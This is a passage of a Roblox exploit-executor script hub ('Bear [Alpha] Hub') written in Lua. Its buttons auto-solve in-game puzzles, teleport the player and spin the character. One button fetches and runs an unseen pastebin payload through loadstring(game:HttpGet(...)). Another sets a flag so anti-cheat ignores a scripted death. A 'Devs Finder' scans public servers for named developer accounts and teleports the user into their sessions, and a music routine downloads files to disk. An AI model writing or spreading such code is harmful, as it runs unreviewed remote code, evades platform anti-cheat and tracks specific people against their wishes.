 if PlayerGui:FindFirstChild("PinkGui") then PlayerGui.PinkGui:Destroy() end
 local gui = Instance.new("ScreenGui", PlayerGui)
 gui.Name = "PinkGui"
 gui.ResetOnSpawn = false

 local frame = Instance.new("Frame", gui)
 frame.Size = UDim2.new(0, 250, 0, 100)
 frame.Position = UDim2.new(0.5, -125, 0.05, 0)
 frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
 frame.Active = true
 frame.Draggable = true
 local corner = Instance.new("UICorner", frame)
 corner.CornerRadius = UDim.new(0, 8)

 local title = Instance.new("TextLabel", frame)
 title.Size = UDim2.new(1, 0, 0, 30)
 title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
 title.Text = "Pink Hide and Seek"
 title.TextColor3 = Color3.new(1, 1, 1)
 title.Font = Enum.Font.SourceSansBold
 title.TextSize = 16
 Instance.new("UICorner", title)

 local label = Instance.new("TextLabel", frame)
 label.Size = UDim2.new(1, -10, 0, 40)
 label.Position = UDim2.new(0, 5, 0, 40)
 label.BackgroundTransparency = 1
 label.TextColor3 = Color3.new(1, 1, 1)
 label.TextScaled = true
 label.Text = "Idle"

 local minBtn = Instance.new("TextButton", frame)
 minBtn.Size = UDim2.new(0, 25, 0, 25)
 minBtn.Position = UDim2.new(1, -30, 0, 2.5)
 minBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
 minBtn.Text = "-"
 minBtn.TextColor3 = Color3.new(1, 1, 1)
 Instance.new("UICorner", minBtn)

 local isMinimized = false
 minBtn.MouseButton1Click:Connect(function()
 isMinimized = not isMinimized
 frame:TweenSize(isMinimized and UDim2.new(0, 250, 0, 30) or UDim2.new(0, 250, 0, 100), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.2)
 label.Visible = not isMinimized
 end)

 task.spawn(function()
 local found = false
 for _, item in ipairs(MAP:GetDescendants()) do
 if item.Name == "Pink" and item:IsA("BasePart") then
 found = true
 label.Text = "Found Pink! Teleporting..."
 root.CFrame = CFrame.new(item.Position + Vector3.new(0, 3, 0))
 task.wait(0.87)
 end
 end

 if not found then
 label.Text = "Pink not found! (Lone House only)"
 task.wait(2)
 gui:Destroy()
 return
 end

 label.Text = "Hide & Seek Complete!"
 task.wait(2)
 gui:Destroy()
 end)

 print("Bear [Alpha] Hub!: Hide and Seek Executed✔")
 end,
})


local Button = Tab:CreateButton({
 Name = "Complete Color Code (approach it to automatically complete)",
 Callback = function()
local player = game.Players.LocalPlayer
local PlayerGui = player:WaitForChild("PlayerGui")

if PlayerGui:FindFirstChild("ColorCodeGui") then
	PlayerGui.ColorCodeGui:Destroy()
end

local gui = Instance.new("ScreenGui")
gui.Name = "ColorCodeGui"
gui.ResetOnSpawn = false
gui.Parent = PlayerGui

local frame = Instance.new("Frame")
frame.Name = "MainFrame"
frame.Size = UDim2.new(0, 300, 0, 200)
frame.Position = UDim2.new(0.5, -150, 0.1, 0)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 30)
title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
title.Text = "Color Code Panel"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.SourceSansBold
title.TextSize = 18
title.Parent = frame
local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 10)
titleCorner.Parent = title

local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 30, 0, 30)
closeBtn.Position = UDim2.new(1, -35, 0, 0)
closeBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
closeBtn.Text = "X"
closeBtn.TextColor3 = Color3.new(1, 1, 1)
closeBtn.Font = Enum.Font.SourceSansBold
closeBtn.TextSize = 18
closeBtn.Parent = frame
local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 10)
closeCorner.Parent = closeBtn

local codeLabel = Instance.new("TextLabel", frame)
codeLabel.Size = UDim2.new(0.9, 0, 0, 40)
codeLabel.Position = UDim2.new(0.05, 0, 0.2, 0)
codeLabel.BackgroundTransparency = 1
codeLabel.TextColor3 = Color3.new(1, 1, 1)
codeLabel.TextScaled = true
codeLabel.Font = Enum.Font.SourceSansBold
codeLabel.Text = "Searching..."

local statusLabel = Instance.new("TextLabel", frame)
statusLabel.Size = UDim2.new(0.9, 0, 0, 25)
statusLabel.Position = UDim2.new(0.05, 0, 0.52, 0)
statusLabel.BackgroundTransparency = 1
statusLabel.TextColor3 = Color3.fromRGB(150, 255, 150)
statusLabel.TextScaled = true
statusLabel.Font = Enum.Font.SourceSans
statusLabel.Text = "Solver: Idle"

local teleportBtn = Instance.new("TextButton", frame)
teleportBtn.Size = UDim2.new(0.8, 0, 0, 40)
teleportBtn.Position = UDim2.new(0.1, 0, 0.68, 0)
teleportBtn.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
teleportBtn.TextColor3 = Color3.new(1, 1, 1)
teleportBtn.TextScaled = true
teleportBtn.Font = Enum.Font.SourceSansBold
teleportBtn.Text = "Teleport to Pads"
local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 8)
btnCorner.Parent = teleportBtn

local active = true

closeBtn.MouseButton1Click:Connect(function()
	active = false
	gui:Destroy()
end)

teleportBtn.MouseButton1Click:Connect(function()
	local target = workspace:FindFirstChild("Map")
	target = target and target:FindFirstChild("ColorCode")
	target = target and target:FindFirstChild("Base")
	target = target and target:FindFirstChild("RootPart")
	if target and target:IsA("BasePart") then
		local char = player.Character
		if char and char:FindFirstChild("HumanoidRootPart") then
			char.HumanoidRootPart.CFrame = target.CFrame + Vector3.new(0, 2, 0)
		end
	end
end)

local function updateCodeLabel()
	local map = workspace:FindFirstChild("Map")
	local colorCodeFolder = map and map:FindFirstChild("ColorCode")
	local positions = colorCodeFolder and colorCodeFolder:FindFirstChild("CodePositions")
	if positions then
		local note = positions:FindFirstChild("Note", true)
		local frameObj = note and note:FindFirstChild("Frame")
		if frameObj then
			local p1 = frameObj:FindFirstChild("1")
			local p2 = frameObj:FindFirstChild("2")
			local p3 = frameObj:FindFirstChild("3")
			local p4 = frameObj:FindFirstChild("4")
			if p1 and p2 and p3 and p4 then
				codeLabel.Text = p1.Text .. " " .. p2.Text .. " " .. p3.Text .. " " .. p4.Text
				return
			end
		end
	end
	codeLabel.Text = "Code Not Found!"
end

updateCodeLabel()

local COLORS = {"R","O","Y","G","B","Pi","Pu","Bl"}
local colorIndex = {}
for i, v in ipairs(COLORS) do colorIndex[v] = i end

local function burstSolve(buttonsBase, clueFrame)
	local solvedCount = 0
	for i = 1, 4 do
		if not active then break end
		local btn = buttonsBase:FindFirstChild(tostring(i))
		local clue = clueFrame:FindFirstChild(tostring(i))
		if btn and clue then
			local btnNote = btn:FindFirstChild("Note")
			local btnLabel = btnNote and btnNote:FindFirstChild("Label")
			local click = btn:FindFirstChildOfClass("ClickDetector")
			if btnLabel and click then
				local target = clue.Text
				local current = btnLabel.Text
				local ci = colorIndex[current] or 1
				local ti = colorIndex[target] or 1
				local clicks = (ti - ci) % #COLORS
				for _ = 1, clicks do
					if not active then break end
					fireclickdetector(click)
				end
				solvedCount += 1
			end
		end
	end
	return solvedCount
end

task.spawn(function()
	while active do
		local map = workspace:WaitForChild("Map", 3)
		if map then
			local colorCode = map:FindFirstChild("ColorCode")
			if colorCode then
				local buttonsBase = colorCode:FindFirstChild("Base") and colorCode.Base:FindFirstChild("Buttons")
				local clueFrame =
					(colorCode:FindFirstChild("CodePositions")
						and colorCode.CodePositions:FindFirstChild("Clue")
						and colorCode.CodePositions.Clue:FindFirstChild("Note")
						and colorCode.CodePositions.Clue.Note:FindFirstChild("Frame"))
					or
					(colorCode:FindFirstChild("CodePositions")
						and colorCode.CodePositions:FindFirstChild("Note")
						and colorCode.CodePositions.Note:FindFirstChild("Frame"))

				if buttonsBase and clueFrame then
					statusLabel.Text = "Solver: Solving..."
					statusLabel.TextColor3 = Color3.fromRGB(255, 200, 80)
					local solvedCount = burstSolve(buttonsBase, clueFrame)
					if solvedCount == 4 then
						statusLabel.Text = "Solver: ✔ Solved!"
						statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
					else
						statusLabel.Text = "Solver: " .. solvedCount .. "/4 matched"
						statusLabel.TextColor3 = Color3.fromRGB(255, 120, 80)
					end
					updateCodeLabel()
				else
					statusLabel.Text = "Solver: Waiting for map..."
					statusLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
				end
			end
		end
		task.wait(0.1)
	end
end) 

 print("Bear [Alpha] Hub!: Color Code Completion Script Executed✔")
 end,
})

local Section = Tab:CreateSection("ESP")

local Button = Tab:CreateButton({
 Name = "Puzzle ESP",
 Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/E7KqXwBh"))()
end,
})

local Tab = Window:CreateTab("Fun", "smile")

local Button = Tab:CreateButton({
    Name = "disco blinds your eyes!!",
    Callback = function() 
        local RunService = game:GetService("RunService")
        local Lighting = game:GetService("Lighting")

        -- 1. Wipe out the Fog and Darkness
        Lighting.FogEnd = 1e6
        Lighting.Brightness = 3
        Lighting.GlobalShadows = false
        Lighting.Ambient = Color3.fromRGB(255, 255, 255)
        Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)

        -- 2. Setup the Blinding 360 Lights
        local player = game.Players.LocalPlayer
        local char = player.Character or player.CharacterAdded:Wait()
        local hrp = char:WaitForChild("HumanoidRootPart", 5)
        
        -- Find the existing light or create a base one if the game's light is missing
        local originalLight = hrp:FindFirstChildOfClass("SurfaceLight") or Instance.new("SurfaceLight", hrp)

        local discoLights = {}
        local faces = {
            Enum.NormalId.Front, Enum.NormalId.Back, Enum.NormalId.Top, 
            Enum.NormalId.Bottom, Enum.NormalId.Left, Enum.NormalId.Right
        }

        originalLight.Range = 500 
        originalLight.Shadows = false 
        originalLight.Enabled = true

        -- Ensure all 6 faces are covered
        for _, face in ipairs(faces) do
            local l = hrp:FindFirstChild("DiscoLight_" .. face.Name) or originalLight:Clone()
            l.Name = "DiscoLight_" .. face.Name
            l.Face = face
            l.Parent = hrp
            table.insert(discoLights, l)
        end

        -- 3. The Rave Loop
        local t = 0
        local conn
        conn = RunService.RenderStepped:Connect(function(dt)
            if not char or not char:Parent() then 
                conn:Disconnect() 
                return 
            end
            
            t += dt * 8
            local color = Color3.fromHSV((t % 6) / 6, 1, 1)
            local brightness = 20 + (math.sin(t * 4) + 1) * 10 

            for _, l in ipairs(discoLights) do
                l.Color = color
                l.Brightness = brightness
            end
        end)
        
        print("Bear [Alpha] Hub!: Blinding Disco Activated✔")
    end,
})

local Button = Tab:CreateButton({
    Name = "Bear Ritual",
    Callback = function()
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
local humanoid = character:WaitForChild("Humanoid")

-- Configuration
local LIFT_HEIGHT = 18
local LIFT_TIME = 6
local SPIN_SPEED = 24
local SPIN_SMOOTH_TIME = 0.1
local SMOOTH_DECREASE_DURATION = 7
local TOTAL_TIME = 10

-- Create BodyVelocity for upward movement
local bv = Instance.new("BodyVelocity")
bv.Velocity = Vector3.new(0, LIFT_HEIGHT / LIFT_TIME, 0)
bv.MaxForce = Vector3.new(0, math.huge, 0)
bv.Parent = humanoidRootPart

-- Create BodyAngularVelocity for spinning
local bav = Instance.new("BodyAngularVelocity")
bav.AngularVelocity = Vector3.new(0, SPIN_SPEED, 0)
bav.MaxTorque = Vector3.new(0, math.huge, 0)
bav.Parent = humanoidRootPart

-- 1. Lift and Spin
local tweenInfo = TweenInfo.new(LIFT_TIME, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
local tween = TweenService:Create(bv, tweenInfo, { Velocity = Vector3.new(0, 0, 0) })
tween:Play()

-- 2. Smooth spin decrease after 2 seconds
task.delay(2, function()
    local smoothTweenInfo = TweenInfo.new(SMOOTH_DECREASE_DURATION, Enum.EasingStyle.Linear)
    local smoothTween = TweenService:Create(bav, smoothTweenInfo, { AngularVelocity = Vector3.new(0, SPIN_SMOOTH_TIME, 0) })
    smoothTween:Play()
end)

-- 3. Kill character after TOTAL_TIME seconds
task.delay(TOTAL_TIME, function()

    -- Cleanup physics objects
    if bv and bv.Parent then bv:Destroy() end
    if bav and bav.Parent then bav:Destroy() end

    -- Signal for AC to ignore (executor environments only)
    if getgenv then
        getgenv().isKillSurv = true
    end

    humanoid.Health = 0
    humanoid:ChangeState(Enum.HumanoidStateType.Dead)

    task.delay(0.15, function()
    end)
end)
end,
})

local Button = Tab:CreateButton({
    Name = "Devs Finder",
    Callback = function() 
-- BEAR Devs Finder

local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")

-- ══════════════════════════════════════════
--              CONFIGURATION
-- ══════════════════════════════════════════

local TARGET_IDS = {
    [53994495]  = "macabreroses",
    [295696228] = "Manny",
    [114931758] = "DaDominator",
    [354426046] = "Shroombaloombie",
}

local PAGE_LIMIT = 15

-- ══════════════════════════════════════════
--              GUI SETUP
-- ══════════════════════════════════════════

if CoreGui:FindFirstChild("PlayerFinderUI") then
    CoreGui:FindFirstChild("PlayerFinderUI"):Destroy()
end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "PlayerFinderUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = CoreGui

-- ── Main Frame ─────────────────────────────
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 310, 0, 340)
MainFrame.Position = UDim2.new(0.5, -155, 0.5, -170)
MainFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 10)
UICorner.Parent = MainFrame

local Stroke = Instance.new("UIStroke")
Stroke.Color = Color3.fromRGB(80, 60, 180)
Stroke.Thickness = 1.5
Stroke.Parent = MainFrame

-- ── Title Bar ──────────────────────────────
local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 38)
TitleBar.BackgroundColor3 = Color3.fromRGB(28, 20, 50)
TitleBar.BorderSizePixel = 0
TitleBar.Parent = MainFrame

local TitleCorner = Instance.new("UICorner")
TitleCorner.CornerRadius = UDim.new(0, 10)
TitleCorner.Parent = TitleBar

local TitleFill = Instance.new("Frame")
TitleFill.Size = UDim2.new(1, 0, 0.5, 0)
TitleFill.Position = UDim2.new(0, 0, 0.5, 0)
TitleFill.BackgroundColor3 = Color3.fromRGB(28, 20, 50)
TitleFill.BorderSizePixel = 0
TitleFill.Parent = TitleBar

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(1, -80, 1, 0)
TitleLabel.Position = UDim2.new(0, 12, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "🔍  Devs Finder"
TitleLabel.TextColor3 = Color3.fromRGB(200, 180, 255)
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.TextSize = 14
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
TitleLabel.Parent = TitleBar

-- Minimize Button
local MinBtn = Instance.new("TextButton")
MinBtn.Size = UDim2.new(0, 28, 0, 22)
MinBtn.Position = UDim2.new(1, -36, 0.5, -11)
MinBtn.BackgroundColor3 = Color3.fromRGB(60, 40, 100)
MinBtn.Text = "─"
MinBtn.TextColor3 = Color3.fromRGB(200, 180, 255)
MinBtn.Font = Enum.Font.GothamBold
MinBtn.TextSize = 13
MinBtn.BorderSizePixel = 0
MinBtn.Parent = TitleBar

local MinCorner = Instance.new("UICorner")
MinCorner.CornerRadius = UDim.new(0, 6)
MinCorner.Parent = MinBtn

-- ── Status Bar ─────────────────────────────
local StatusBar = Instance.new("Frame")
StatusBar.Size = UDim2.new(1, -16, 0, 28)
StatusBar.Position = UDim2.new(0, 8, 0, 46)
StatusBar.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
StatusBar.BorderSizePixel = 0
StatusBar.Parent = MainFrame

local StatusCorner = Instance.new("UICorner")
StatusCorner.CornerRadius = UDim.new(0, 6)
StatusCorner.Parent = StatusBar

local StatusDot = Instance.new("Frame")
StatusDot.Size = UDim2.new(0, 8, 0, 8)
StatusDot.Position = UDim2.new(0, 8, 0.5, -4)
StatusDot.BackgroundColor3 = Color3.fromRGB(255, 200, 50)
StatusDot.BorderSizePixel = 0
StatusDot.Parent = StatusBar

local StatusDotCorner = Instance.new("UICorner")
StatusDotCorner.CornerRadius = UDim.new(1, 0)
StatusDotCorner.Parent = StatusDot

local StatusLabel = Instance.new("TextLabel")
StatusLabel.Size = UDim2.new(1, -26, 1, 0)
StatusLabel.Position = UDim2.new(0, 22, 0, 0)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Text = "Idle - press Scan to start"
StatusLabel.TextColor3 = Color3.fromRGB(180, 180, 200)
StatusLabel.Font = Enum.Font.Gotham
StatusLabel.TextSize = 12
StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
StatusLabel.Parent = StatusBar

-- ── Scroll Frame ───────────────────────────
local ScrollFrame = Instance.new("ScrollingFrame")
ScrollFrame.Size = UDim2.new(1, -16, 0, 200)
ScrollFrame.Position = UDim2.new(0, 8, 0, 82)
ScrollFrame.BackgroundColor3 = Color3.fromRGB(13, 13, 18)
ScrollFrame.BorderSizePixel = 0
ScrollFrame.ScrollBarThickness = 4
ScrollFrame.ScrollBarImageColor3 = Color3.fromRGB(100, 70, 200)
ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
ScrollFrame.Parent = MainFrame

local ScrollCorner = Instance.new("UICorner")
ScrollCorner.CornerRadius = UDim.new(0, 6)
ScrollCorner.Parent = ScrollFrame

local ListLayout = Instance.new("UIListLayout")
ListLayout.Padding = UDim.new(0, 6)
ListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
ListLayout.Parent = ScrollFrame

local ScrollPad = Instance.new("UIPadding")
ScrollPad.PaddingTop = UDim.new(0, 6)
ScrollPad.PaddingBottom = UDim.new(0, 6)
ScrollPad.Parent = ScrollFrame

-- ── Buttons ────────────────────────────────
local ScanBtn = Instance.new("TextButton")
ScanBtn.Size = UDim2.new(0, 130, 0, 32)
ScanBtn.Position = UDim2.new(0, 8, 1, -42)
ScanBtn.BackgroundColor3 = Color3.fromRGB(80, 50, 160)
ScanBtn.Text = "▶  Scan Now"
ScanBtn.TextColor3 = Color3.fromRGB(230, 220, 255)
ScanBtn.Font = Enum.Font.GothamBold
ScanBtn.TextSize = 13
ScanBtn.BorderSizePixel = 0
ScanBtn.Parent = MainFrame

local ScanCorner = Instance.new("UICorner")
ScanCorner.CornerRadius = UDim.new(0, 8)
ScanCorner.Parent = ScanBtn

local JoinBtn = Instance.new("TextButton")
JoinBtn.Size = UDim2.new(0, 155, 0, 32)
JoinBtn.Position = UDim2.new(1, -163, 1, -42)
JoinBtn.BackgroundColor3 = Color3.fromRGB(50, 70, 50)
JoinBtn.Text = "⚡  Join Random Found"
JoinBtn.TextColor3 = Color3.fromRGB(200, 255, 220)
JoinBtn.Font = Enum.Font.GothamBold
JoinBtn.TextSize = 12
JoinBtn.BorderSizePixel = 0
JoinBtn.Active = false
JoinBtn.Parent = MainFrame

local JoinCorner = Instance.new("UICorner")
JoinCorner.CornerRadius = UDim.new(0, 8)
JoinCorner.Parent = JoinBtn

-- ══════════════════════════════════════════
--              STATE
-- ══════════════════════════════════════════

local foundResults = {}
local isScanning   = false
local minimized    = false

-- ══════════════════════════════════════════
--              HELPERS
-- ══════════════════════════════════════════

local function setStatus(text, color)
    StatusLabel.Text = text
    StatusDot.BackgroundColor3 = color or Color3.fromRGB(255, 200, 50)
end

local function setScanBtnEnabled(enabled)
    ScanBtn.Active = enabled
    ScanBtn.BackgroundColor3 = enabled
        and Color3.fromRGB(80, 50, 160)
        or  Color3.fromRGB(45, 30, 80)
    ScanBtn.Text = enabled and "▶  Scan Now" or "⏳  Scanning..."
end

local function getAvatarThumb(userId)
    local ok, result = pcall(function()
        return Players:GetUserThumbnailAsync(
            userId,
            Enum.ThumbnailType.HeadShot,
            Enum.ThumbnailSize.Size48x48
        )
    end)
    return ok and result or ""
end

local function clearCards()
    for _, c in pairs(ScrollFrame:GetChildren()) do
        if c:IsA("Frame") then c:Destroy() end
    end
    ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
end

local function updateCanvasSize()
    ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, ListLayout.AbsoluteContentSize.Y + 12)
end

local function makeCard(userId, username, found, data)
    local card = Instance.new("Frame")
    card.Size = UDim2.new(1, -12, 0, 54)
    card.BackgroundColor3 = found
        and Color3.fromRGB(24, 22, 38)
        or  Color3.fromRGB(20, 18, 32)
    card.BorderSizePixel = 0
    card.Parent = ScrollFrame

    local cc = Instance.new("UICorner")
    cc.CornerRadius = UDim.new(0, 7)
    cc.Parent = card

    local cs = Instance.new("UIStroke")
    cs.Color = found
        and Color3.fromRGB(70, 50, 140)
        or  Color3.fromRGB(50, 40, 80)
    cs.Thickness = 1
    cs.Parent = card

    local avatar = Instance.new("ImageLabel")
    avatar.Size = UDim2.new(0, 38, 0, 38)
    avatar.Position = UDim2.new(0, 8, 0.5, -19)
    avatar.BackgroundColor3 = Color3.fromRGB(40, 35, 60)
    avatar.BorderSizePixel = 0
    avatar.Image = getAvatarThumb(userId)
    avatar.Parent = card

    local ac = Instance.new("UICorner")
    ac.CornerRadius = UDim.new(0, 6)
    ac.Parent = avatar

    local nameLabel = Instance.new("TextLabel")
    nameLabel.Size = UDim2.new(1, -60, 0, 20)
    nameLabel.Position = UDim2.new(0, 54, 0, 7)
    nameLabel.BackgroundTransparency = 1
    nameLabel.Text = (found and "🟢  " or "⚫  ") .. username
    nameLabel.TextColor3 = found
        and Color3.fromRGB(220, 210, 255)
        or  Color3.fromRGB(140, 130, 160)
    nameLabel.Font = Enum.Font.GothamBold
    nameLabel.TextSize = 13
    nameLabel.TextXAlignment = Enum.TextXAlignment.Left
    nameLabel.Parent = card

    local infoLabel = Instance.new("TextLabel")
    infoLabel.Size = UDim2.new(1, -60, 0, 16)
    infoLabel.Position = UDim2.new(0, 54, 0, 28)
    infoLabel.BackgroundTransparency = 1
    infoLabel.Text = found
        and ("📍 " .. (data.gameName or tostring(data.gameId)))
        or  "Not found in any server"
    infoLabel.TextColor3 = found
        and Color3.fromRGB(140, 130, 170)
        or  Color3.fromRGB(100, 90, 120)
    infoLabel.Font = Enum.Font.Gotham
    infoLabel.TextSize = 11
    infoLabel.TextXAlignment = Enum.TextXAlignment.Left
    infoLabel.TextTruncate = Enum.TextTruncate.AtEnd
    infoLabel.Parent = card

    updateCanvasSize()
end

-- ══════════════════════════════════════════
--              CORE SCAN LOGIC
-- ══════════════════════════════════════════

local function findPlayerInGame(userId, placeId)
    local cursor = ""
    for _ = 1, PAGE_LIMIT do
        local url = ("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100"):format(placeId)
        if cursor ~= "" then
            url = url .. "&cursor=" .. cursor
        end

        local ok, response = pcall(game.HttpGetAsync, game, url)
        if not ok then break end

        local parsed
        ok, parsed = pcall(HttpService.JSONDecode, HttpService, response)
        if not ok or not parsed or not parsed.data then break end

        for _, server in ipairs(parsed.data) do
            if server.playerIds then
                for _, pid in ipairs(server.playerIds) do
                    if pid == userId then
                        return server.id
                    end
                end
            end
        end

        if parsed.nextPageCursor and parsed.nextPageCursor ~= "" then
            cursor = parsed.nextPageCursor
        else
            break
        end
    end
    return nil
end

local function getGameName(placeId)
    local ok, response = pcall(
        game.HttpGetAsync, game,
        ("https://games.roblox.com/v1/games/multiget-place-details?placeIds=%d"):format(placeId)
    )
    if not ok then return tostring(placeId) end
    local parsed
    ok, parsed = pcall(HttpService.JSONDecode, HttpService, response)
    if ok and parsed and parsed[1] then
        return parsed[1].name or tostring(placeId)
    end
    return tostring(placeId)
end

local function doScan()
    if isScanning then return end
    isScanning = true
    foundResults = {}

    clearCards()
    setScanBtnEnabled(false)
    JoinBtn.Active = false
    JoinBtn.BackgroundColor3 = Color3.fromRGB(50, 70, 50)

    local placeId  = game.PlaceId
    local gameName = getGameName(placeId)
    local found    = 0

    setStatus("Scanning servers...", Color3.fromRGB(100, 150, 255))

    for userId, username in pairs(TARGET_IDS) do
        setStatus("Checking " .. username .. "...", Color3.fromRGB(100, 150, 255))
        local jobId = findPlayerInGame(userId, placeId)

        if jobId then
            found = found + 1
            local entry = {
                userId   = userId,
                username = username,
                jobId    = jobId,
                gameId   = placeId,
                gameName = gameName,
            }
            table.insert(foundResults, entry)
            makeCard(userId, username, true, entry)
        else
            makeCard(userId, username, false, {})
        end

        task.wait(0.3)
    end

    if found > 0 then
        setStatus(("✅ Found %d player(s)! Ready to join."):format(found), Color3.fromRGB(60, 220, 100))
        JoinBtn.Active = true
        JoinBtn.BackgroundColor3 = Color3.fromRGB(30, 150, 80)
    else
        setStatus("❌ No devs found. Try scanning again.", Color3.fromRGB(220, 80, 80))
    end

    setScanBtnEnabled(true)
    isScanning = false
end

-- ══════════════════════════════════════════
--              BUTTON CALLBACKS
-- ══════════════════════════════════════════

ScanBtn.MouseButton1Click:Connect(function()
    task.spawn(doScan)
end)

JoinBtn.MouseButton1Click:Connect(function()
    if #foundResults == 0 then return end
    local pick = foundResults[math.random(1, #foundResults)]
    setStatus("⚡ Teleporting to " .. pick.username .. "...", Color3.fromRGB(255, 180, 50))
    task.wait(0.5)
    TeleportService:TeleportToPlaceInstance(pick.gameId, pick.jobId, Players.LocalPlayer)
end)

MinBtn.MouseButton1Click:Connect(function()
    minimized = not minimized
    if minimized then
        MainFrame:TweenSize(UDim2.new(0, 310, 0, 38), "Out", "Quad", 0.2, true)
        MinBtn.Text = "▲"
    else
        MainFrame:TweenSize(UDim2.new(0, 310, 0, 340), "Out", "Quad", 0.2, true)
        MinBtn.Text = "─"
    end
end)

-- ══════════════════════════════════════════
--              INIT - placeholder cards
-- ══════════════════════════════════════════

for userId, username in pairs(TARGET_IDS) do
    makeCard(userId, username, false, {})
end

setStatus("Ready, click Scan Now to begin.", Color3.fromRGB(255, 200, 50))
end,
})

local Button = Tab:CreateButton({
    Name = "2019-2022 goes brrr",
    Callback = function() 
-- ======================
-- Persistent Lobby Music + Old Lobby Bringer
-- ======================

local SoundService = game:GetService("SoundService")
local Teams = game:GetService("Teams")
local Workspace = game:GetService("Workspace")

-- Folder
local musicFolder = "OldLobbyMusics"
if not isfolder(musicFolder) then
makefolder(musicFolder)
end

-- Tracks
local musicFiles = {
{name="washed_out.mp3", url="https://files.catbox.moe/j2bmlv.mp3"},
{name="entering_graciously.mp3", url="https://files.catbox.moe/x60m5v.mp3"},
{name="wii.mp3", url="https://files.catbox.moe/m8j5eg.mp3"},
{name="club_penguin.mp3", url="https://files.catbox.moe/wsmyz6.mp3"},
{name="saint_pepsi.mp3", url="https://files.catbox.moe/txvmce.mp3"}
}

-- Persistent globals
getgenv().LobbySound = getgenv().LobbySound or nil
getgenv().LastTrack = getgenv().LastTrack or nil

-- Downloader
local request = (syn and syn.request) or (http and http.request) or http_request
for _, m in ipairs(musicFiles) do
local path = musicFolder .. "/" .. m.name
if not isfile(path) and request then
local r = request({Url = m.url, Method = "GET"})
if r.Success and r.Body then
writefile(path, r.Body)
end
end
end

-- Mute helper
local function setWorkspaceMuted(state)
local m = Workspace:FindFirstChild("Music")
if m and m:IsA("Sound") then
m.Volume = state and 0 or 1
end
end

-- Stop function
local function stopLobbyMusic()
if getgenv().LobbySound then
getgenv().LobbySound:Stop()
getgenv().LobbySound:Destroy()
getgenv().LobbySound = nil
setWorkspaceMuted(false)
end
end

-- Pick random (no repeat)
local function pickTrack()
local pick
repeat
pick = musicFiles[math.random(#musicFiles)]
until pick.name ~= getgenv().LastTrack
return pick
end

-- Play function
local function playLobbyMusic()
stopLobbyMusic()

local track = pickTrack()  
getgenv().LastTrack = track.name  

local path = musicFolder .. "/" .. track.name  
if not isfile(path) then return end  

local sound = Instance.new("Sound")  
sound.SoundId = getcustomasset(path)  
sound.Volume = 1  
sound.Looped = false  
sound.Parent = SoundService  

getgenv().LobbySound = sound  
setWorkspaceMuted(true)  

task.spawn(function()  
    pcall(function() sound:Play() end)  
    sound.Ended:Wait()  
    if getgenv().LobbySound == sound then  
        stopLobbyMusic()  
    end  
end)

end

-- ======================
-- OLD LOBBY BRINGER
-- ======================

local Lobby = workspace:WaitForChild("Lobby", 10)
if Lobby then
local MapVote = Lobby:WaitForChild("_MapVote", 10)
if MapVote then
local function safeDestroy(obj)
if obj and obj.Parent then
obj:Destroy()
end
end

local function cleanup()  
        if MapVote:FindFirstChild("Options") then  
            local Options = MapVote.Options  
            safeDestroy(Options:FindFirstChild("4"))  

            for i = 1,3 do  
                local opt = Options:FindFirstChild(tostring(i))  
                if opt then  
                    safeDestroy(opt:FindFirstChild("Cable"))  
                end  
            end  
        end  

        safeDestroy(MapVote:FindFirstChild("Platform"))  
        safeDestroy(MapVote:FindFirstChild("Part"))  
        safeDestroy(MapVote:FindFirstChild("Roulette"))  
        safeDestroy(MapVote:FindFirstChild("Label"))  
    end  

    cleanup()  
    MapVote.DescendantAdded:Connect(function()  
        task.wait()  
        cleanup()  
    end)  
